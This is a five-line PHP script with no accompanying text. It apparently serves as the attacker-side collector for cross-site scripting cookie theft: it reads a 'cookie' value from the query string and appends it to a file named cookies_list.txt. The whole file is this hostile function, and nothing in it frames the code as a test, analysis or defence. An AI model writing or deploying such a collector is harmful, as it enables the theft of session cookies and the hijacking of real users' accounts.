<?php
	$handle=fopen("cookies_list.txt","a");
	fputs($handle,"\n".$_GET["cookie"]."\n");
	fclose($handle);
?>